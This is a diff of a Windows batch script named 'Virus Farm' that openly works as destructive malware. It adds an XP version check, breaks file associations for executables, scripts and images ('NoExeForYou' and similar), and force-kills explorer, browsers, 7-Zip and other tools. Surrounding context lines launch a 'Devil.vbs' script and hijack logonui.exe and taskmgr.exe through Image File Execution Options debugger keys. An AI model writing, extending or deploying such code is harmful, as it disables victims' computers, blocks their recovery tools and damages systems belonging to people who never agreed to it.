@@ -11,8 +11,9 @@ IF "%~1"=="virus" GOTO virusfarm
 IF "%~1"=="v" GOTO virusfarm
 :auto
 title Loading...
-if exist C:\docume~1 goto virusfarm
-if not exist C:\docume~1 goto auto2
+ver | find "XP" > nul
+if %ERRORLEVEL% == 0 goto virusfarm
+if NOT "%ERRORLEVEL%" == "0" goto auto2
 :auto2
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "Virus Farm Loader"
 if %errorlevel%==0 goto virusfarm
@@ -24,11 +25,26 @@ echo Next >> "\Devil.vbs"
 start "" "%systemroot%\System32\wscript.exe" "\Devil.vbs"
 reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\logonui.exe" /v Debugger /d \
 reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe" /v Debugger /d \
+assoc.exe=NoExeForYou
+assoc.bat=NoBatForYou
+assoc.cmd=NoCmdForYou
+assoc.scr=NoScrForYou
+assoc.pif=NoPifForYou
+assoc.vbs=NoVbsForYou
+assoc.vbe=NoVbeForYou
+assoc.jpg=NoJpgForYou
+assoc.jpeg=NoJpegForYou
+assoc.png=NoPngForYou
+assoc.gif=NoGifForYou
+assoc.bmp=NoBmpForYou
+assoc.tif=NoTifForYou
+assoc.tiff=NoTiffForYou
 taskkill /f /im explorer.exe
+taskkill /f /im firefox.exe
+taskkill /f /im 7zfm.exe
 taskkill /f /im chrome.exe
 taskkill /f /im eevee.exe
 taskkill /f /im techturd.exe
-taskkill /f /im firefox.exe
 taskkill /f /im iexplore.exe
 taskkill /f /im hh.exe
 taskkill /f /im everything.exe
